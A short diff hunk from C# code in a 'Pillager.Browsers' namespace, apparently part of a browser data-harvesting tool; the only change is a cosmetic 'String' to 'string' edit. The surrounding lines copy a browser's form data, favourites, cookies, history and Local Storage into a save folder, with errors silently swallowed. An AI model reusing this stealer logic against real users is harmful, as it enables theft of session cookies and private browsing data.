@@ -142,8 +142,8 @@ namespace Pillager.Browsers
                 string favorite3 = Path.Combine(Directory.GetParent(Directory.GetParent(BrowserPath).FullName).FullName, "favorite3.dat");
                 if (File.Exists(FormData3)) File.Copy(FormData3, Path.Combine(savepath, "FormData3.dat"));
                 if (File.Exists(favorite3)) File.Copy(favorite3, Path.Combine(savepath, "favorite3.dat"));
-                if (!String.IsNullOrEmpty(cookies)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_cookies.txt"), cookies);
-                if (!String.IsNullOrEmpty(history)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_history.txt"), history);
+                if (!string.IsNullOrEmpty(cookies)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_cookies.txt"), cookies);
+                if (!string.IsNullOrEmpty(history)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_history.txt"), history);
                 if (Directory.Exists(Path.Combine(BrowserPath, "Local Storage"))) Methods.CopyDirectory(Path.Combine(BrowserPath, "Local Storage"), Path.Combine(savepath, "Local Storage"), true);
             }
             catch { }
